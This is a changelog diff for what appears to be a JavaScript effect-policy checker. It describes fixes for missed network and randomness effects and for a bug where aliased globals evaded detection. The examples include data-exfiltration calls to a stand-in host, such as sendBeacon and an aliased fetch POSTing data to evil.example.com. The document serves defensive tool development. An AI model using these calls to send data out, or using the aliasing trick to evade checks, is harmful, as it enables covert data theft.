@@ -8,6 +8,20 @@ report bytes or gate verdicts (regenerate baselines / expect verdict changes acr
 
 ## Unreleased
 
+- **⚠ Two effect-globals were missing outright, found by sweeping the ALIAS spelling across all of
+  them.** `navigator.sendBeacon(url, data)` — the analytics exfiltration primitive, which exists to POST
+  data to a server on unload — was charged NOTHING, so `deny Net` answered exit 0 over
+  `navigator.sendBeacon("https://evil.example.com/collect", data)`. It is Net now, with host capture from
+  argument 0 and `incomplete: Net` on a runtime URL, matching the `xhr.open` and ctor branches. And
+  `crypto.getRandomValues` / `randomUUID` are Rand: node's imported `randomBytes` was always charged,
+  while the browser global resolved to lib.dom and was charged nothing. The alias question was the one
+  asked; the direct call being silent was the answer.
+
+- **The `new` path shared the alias defect** — `const W = WebSocket; new W(url)` matched a ctor named
+  "W". The first cut of the alias fix covered CALLS only, so this was that fix's own sibling. Both paths
+  now share ONE `unaliasGlobal` helper, defined once precisely because this defect has appeared in four
+  spellings and each private copy is how the next one gets missed.
+
 - **⚠ CARDINAL SIN — a global reached through a LOCAL ALIAS was silent.** `const send = fetch;
   send("https://evil.example.com/collect", {method:"POST", body:data})` under `deny Net` answered
   **exit 0, `policy ✓`, 0 effectful functions** on published 0.29.0: a POST of caller data to an external
